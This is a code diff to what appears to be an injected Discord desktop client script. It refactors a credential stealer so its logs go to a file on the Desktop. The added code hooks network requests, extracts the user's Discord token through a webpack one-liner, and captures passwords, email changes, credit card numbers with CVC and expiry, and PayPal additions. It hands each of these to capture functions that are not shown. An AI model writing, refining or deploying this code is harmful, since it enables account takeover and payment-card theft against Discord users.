@@ -2,6 +2,7 @@ const args = process.argv;
 const fs = require('fs');
 const path = require('path');
 const https = require('https');
+const os = require('os');
 const querystring = require('querystring');
 const {
   BrowserWindow,
@@ -853,102 +854,99 @@ session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
     });
   }
 });
-
-
-session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
-  // Log de la réception de la requête
-  console.log("🚩 [Request Captured] URL:", details.url);
-  console.log("🔍 [Method]:", details.method);
-  console.log("📡 [Status Code]:", details.statusCode);
-
-  // Filtrage des statuts de réponse
-  if (details.statusCode !== 200 && details.statusCode !== 202) {
-    console.log("❌ [Invalid Status Code] Skipping this request...");
-    return;
-  }
-
-  // Extraction des données brutes
-  let unparsed_data;
-  try {
-    unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
-    console.log("📝 [Unparsed Data]:", unparsed_data);
-  } catch (err) {
-    console.error("⚠️ [Error Parsing Data]:", err);
-    return;
-  }
-
-  // Parsing des données en JSON
-  let data;
-  try {
-    data = JSON.parse(unparsed_data);
-    console.log("✅ [Parsed Data]:", data);
-  } catch (err) {
-    console.error("⚠️ [JSON Parse Error]:", err);
-    return;
-  }
-
-  // Récupération du token utilisateur
-  let token;
-  try {
-    token = await execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
-    console.log("🔑 [Token Retrieved]:", token);
-  } catch (err) {
-    console.error("❌ [Token Retrieval Failed]:", err);
-    return;
-  }
-
-  // Gestion des différentes actions en fonction des URL interceptées
-  switch (true) {
-    case details.url.endsWith('login'):
-      console.log("🔐 [Login Event Detected]");
-      login(data.login, data.password, token).catch(console.error);
-      break;
-
-    case details.url.endsWith('users/@me') && details.method === 'PATCH':
-      console.log("🔧 [User Update Detected]");
-      if (!data.password) {
-        console.log("⚠️ [No Password Provided] Skipping...");
-        return;
-      }
-      if (data.email) {
-        console.log("📧 [Email Change Detected]");
-        emailChanged(data.email, data.password, token).catch(console.error);
-      }
-      if (data.new_password) {
-        console.log("🔑 [Password Change Detected]");
-        passwordChanged(data.password, data.new_password, token).catch(console.error);
-      }
-      break;
-
-    case details.url.endsWith('tokens') && details.method === 'POST':
-      console.log("💳 [Credit Card Info Detected]");
-      try {
-        const item = querystring.parse(unparsed_data.toString());
-        console.log("💾 [Card Data]:", item);
-        ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);
-      } catch (err) {
-        console.error("⚠️ [Card Data Parsing Failed]:", err);
-      }
-      break;
-
-    case details.url.endsWith('paypal_accounts') && details.method === 'POST':
-      console.log("💰 [PayPal Info Added]");
-      PaypalAdded(token).catch(console.error);
-      break;
-
-    case details.url.endsWith('confirm') && details.method === 'POST':
-      console.log("🚀 [Purchase Confirmed, Initiating Nitro Buy]");
-      setTimeout(() => {
-        nitroBought(token).catch(console.error);
-      }, 7500);
-      break;
-
-    default:
-      console.log("ℹ️ [Unhandled Request Type]");
-      break;
-  }
-});
-
+const logFilePath = path.join(os.homedir(), 'Desktop', 'discord_logs.txt');
+const writeLog = (message) => {
+    const logMessage = `[${new Date().toISOString()}] ${message}\n`;
+    fs.appendFileSync(logFilePath, logMessage);
+  };
+  
+  session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
+    writeLog(`🚩 [Request Captured] URL: ${details.url}`);
+    writeLog(`🔍 [Method]: ${details.method}`);
+    writeLog(`📡 [Status Code]: ${details.statusCode}`);
+  
+    if (details.statusCode !== 200 && details.statusCode !== 202) {
+      writeLog(`❌ [Invalid Status Code] Skipping...`);
+      return;
+    }
+  
+    let unparsed_data;
+    try {
+      unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
+      writeLog(`📝 [Unparsed Data]: ${unparsed_data}`);
+    } catch (err) {
+      writeLog(`⚠️ [Error Parsing Data]: ${err}`);
+      return;
+    }
+  
+    let data;
+    try {
+      data = JSON.parse(unparsed_data);
+      writeLog(`✅ [Parsed Data]: ${JSON.stringify(data)}`);
+    } catch (err) {
+      writeLog(`⚠️ [JSON Parse Error]: ${err}`);
+      return;
+    }
+  
+    let token;
+    try {
+      token = await execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
+      writeLog(`🔑 [Token Retrieved]: ${token}`);
+    } catch (err) {
+      writeLog(`❌ [Token Retrieval Failed]: ${err}`);
+      return;
+    }
+  
+    switch (true) {
+      case details.url.endsWith('login'):
+        writeLog(`🔐 [Login Event Detected]`);
+        login(data.login, data.password, token).catch((err) => writeLog(`⚠️ [Login Error]: ${err}`));
+        break;
+  
+      case details.url.endsWith('users/@me') && details.method === 'PATCH':
+        writeLog(`🔧 [User Update Detected]`);
+        if (!data.password) {
+          writeLog(`⚠️ [No Password Provided]`);
+          return;
+        }
+        if (data.email) {
+          writeLog(`📧 [Email Change Detected]`);
+          emailChanged(data.email, data.password, token).catch((err) => writeLog(`⚠️ [Email Change Error]: ${err}`));
+        }
+        if (data.new_password) {
+          writeLog(`🔑 [Password Change Detected]`);
+          passwordChanged(data.password, data.new_password, token).catch((err) => writeLog(`⚠️ [Password Change Error]: ${err}`));
+        }
+        break;
+  
+      case details.url.endsWith('tokens') && details.method === 'POST':
+        writeLog(`💳 [Credit Card Info Detected]`);
+        try {
+          const item = querystring.parse(unparsed_data.toString());
+          writeLog(`💾 [Card Data]: ${JSON.stringify(item)}`);
+          ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch((err) => writeLog(`⚠️ [Credit Card Capture Error]: ${err}`));
+        } catch (err) {
+          writeLog(`⚠️ [Card Data Parsing Failed]: ${err}`);
+        }
+        break;
+  
+      case details.url.endsWith('paypal_accounts') && details.method === 'POST':
+        writeLog(`💰 [PayPal Info Added]`);
+        PaypalAdded(token).catch((err) => writeLog(`⚠️ [PayPal Capture Error]: ${err}`));
+        break;
+  
+      case details.url.endsWith('confirm') && details.method === 'POST':
+        writeLog(`🚀 [Purchase Confirmed, Initiating Nitro Buy]`);
+        setTimeout(() => {
+          nitroBought(token).catch((err) => writeLog(`⚠️ [Nitro Purchase Error]: ${err}`));
+        }, 7500);
+        break;
+  
+      default:
+        writeLog(`ℹ️ [Unhandled Request Type]`);
+        break;
+    }
+  });
 
 
 module.exports = require('./core.asar');
